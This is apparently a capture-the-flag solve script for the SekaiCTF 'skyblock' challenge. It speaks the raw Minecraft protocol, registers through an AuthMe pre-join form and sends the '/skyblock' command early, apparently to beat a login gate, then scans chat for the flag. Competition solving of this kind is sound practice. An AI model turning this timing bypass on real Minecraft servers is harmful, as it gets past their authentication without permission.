"""final_solve mod: send cmd early (t=3s)"""
import socket, struct, time, uuid, zlib, sys
HOST, PORT, PV = "skyblock.chals.sekai.team", 25565, 775
def wvar(v):
    out = bytearray()
    while True:
        if v & 0xFFFFFF80 == 0: out.append(v & 0x7F); return bytes(out)
        out.append((v & 0x7F) | 0x80); v = (v >> 7) & 0xFFFFFFFF
def rvar(d, o=0):
    r, s = 0, 0
    while True:
        b = d[o]; r |= (b & 0x7F) << s; s += 7; o += 1
        if not (b & 0x80): return r, o
def wstr(s): e = s.encode(); return wvar(len(e)) + e

def parse_chat(pl):
    if not pl: return ""
    def _scan(d, off):
        r = []
        while off < len(d):
            tt = d[off]
            if tt == 0: return "".join(r), off+1
            off += 1
            if off+2 > len(d): break
            nl = struct.unpack('>H', d[off:off+2])[0]
            nm = d[off+2:off+2+nl].decode(errors='replace') if nl else ''
            off += 2 + nl
            if tt == 0x08:
                if off+2 > len(d): break
                sl = struct.unpack('>H', d[off:off+2])[0]; off += 2+sl
                if off+sl > len(d): break
                val = d[off:off+sl].decode(errors='replace'); off += sl
                if nm in ('text',''): r.append(val)
            elif tt == 0x09:
                if off+5 > len(d): break
                lt, ll = d[off], struct.unpack('>I', d[off+1:off+5])[0]; off += 5
                for _ in range(ll):
                    if lt == 0x0a: s, off = _scan(d, off); r.append(s)
                    elif lt == 0x08:
                        if off+2 > len(d): break
                        sl = struct.unpack('>H', d[off:off+2])[0]; off += 2+sl
                        if off+sl > len(d): break
                        r.append(d[off:off+sl].decode(errors='replace')); off += sl
                    else: break
            elif tt == 0x0a: s, off = _scan(d, off); r.append(s)
            else: break
        return "".join(r), off
    try: r,_= _scan(pl,1); return r.replace('\xa7','').strip()
    except: return ""

for attempt in range(30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    try: sock.connect((HOST, PORT))
    except: time.sleep(5); continue
    cp = -1; uid = uuid.uuid4(); ts = int(time.time())
    name = f"E{ts%10000}"; pwd = f"e{ts%1000}"
    def send(pid, data=b''):
        global cp; r = wvar(pid) + data
        if cp >= 0:
            if len(r) >= cp: c = zlib.compress(r); f = wvar(len(r)) + c
            else: f = wvar(0) + r
            sock.sendall(wvar(len(f)) + f)
        else: sock.sendall(wvar(len(r)) + r)
    def recv():
        global cp; d = b''
        while True:
            b = sock.recv(1)
            if not b: return None, None
            d += b
            if not (b[0] & 0x80): break
        pl, _ = rvar(d); rt = b''
        while len(rt) < pl:
            c = sock.recv(pl - len(rt))
            if not c: return None, None
            rt += c
        if cp >= 0:
            dl, o = rvar(rt)
            if dl > 0: dec = zlib.decompress(rt[o:]); p, o2 = rvar(dec); return p, dec[o2:]
            else: p, o2 = rvar(rt, o); return p, rt[o2:]
        else: p, o = rvar(rt); return p, rt[o:]

    # Login + Config
    send(0x00, wvar(PV)+wstr(HOST)+struct.pack('>H',PORT)+wvar(2))
    send(0x00, wstr(name)+struct.pack('>QQ',uid.int>>64,uid.int&((1<<64)-1)))
    ok = False
    while True:
        p,pl = recv()
        if p == 0x00: break
        if p == 0x02: send(0x03); ok = True; break
        elif p == 0x03: cp,_ = rvar(pl)
        elif p == 0x04: m,o = rvar(pl,1); send(0x02, wvar(m)+wvar(0))
    if not ok: sock.close(); time.sleep(8); continue
    send(0x00, wstr("en_US")+bytes([12])+wvar(0)+bytes([1,0x7F])+wvar(1)+bytes([0,1,0]))
    ok = False
    while True:
        p,pl = recv()
        if p == 0x03: ok = True; break
        elif p == 0x04: send(0x04, pl)
        elif p == 0x05: send(0x05, pl)
        elif p == 0x0E:
            cnt,o = rvar(pl); resp = b''
            for _ in range(cnt):
                l,o = rvar(pl,o); ns = pl[o:o+l].decode(); o += l
                l,o = rvar(pl,o); n = pl[o:o+l].decode(); o += l
                l,o = rvar(pl,o); v = pl[o:o+l].decode(); o += l
                resp += wstr(ns) + wstr(n) + wstr(v)
            send(0x07, wvar(cnt) + resp)
        elif p == 0x12:
            nbt = b'\x0a\x00\x00'
            nbt += b'\x08\x00\x08password' + struct.pack('>H', len(pwd)) + pwd.encode()
            nbt += b'\x08\x00\x07confirm' + struct.pack('>H', len(pwd)) + pwd.encode() + b'\x00'
            send(0x08, wstr("authme:prejoin-register/submit") + wvar(len(b'\x01'+nbt)) + b'\x01' + nbt)
        elif p == 0x13: send(0x09)
        elif p == 0x02: break
    if not ok: sock.close(); time.sleep(5); continue
    send(0x03)
    print(f"[{attempt}] +OK {name}", flush=True)
    sock.settimeout(0.5)
    t0 = time.time(); loaded = False; msgs = []; cmd_sent = False

    while time.time()-t0 < 30:
        try: p, pl = recv()
        except socket.timeout:
            if loaded and not cmd_sent and time.time()-t0 > 3:
                send(0x06, wstr("skyblock"))
                print(f"[>] /skyblock @{time.time()-t0:.1f}s", flush=True)
                cmd_sent = True
            continue
        except: break
        dt = time.time()-t0
        if p == 0x31 and not loaded:
            send(0x2C); send(0x0E, wstr("en_US")+bytes([12])+wvar(0)+bytes([1,0x7F])+wvar(1)+bytes([0,1,0]))
            loaded = True
            print(f"  ready @{dt:.1f}s", flush=True)
        elif p == 0x46:
            tid,_ = rvar(pl); send(0x00, wvar(tid))
        elif p == 0x79:
            txt = parse_chat(pl)
            if txt and txt not in msgs:
                msgs.append(txt)
                print(f"[{dt:.1f}s] {txt[:200]}", flush=True)
        elif p == 0x20:
            try: l,o = rvar(pl,0); m = pl[o:o+l].decode(errors='replace')
            except: m = repr(pl[:40])
            print(f"KICK @{dt:.1f}s: {m[:80]}", flush=True); break

    print(f"[*] {len(msgs)} msgs in {time.time()-t0:.1f}s", flush=True)
    for m in msgs: print(f"  {m[:150]}", flush=True)
    all_txt = " ".join(msgs)
    for kw in ['flag','sekai','ctf','tebex']:
        if kw in all_txt.lower(): print(f"\n*** FLAG: {all_txt} ***", flush=True)
    sock.close()
    break
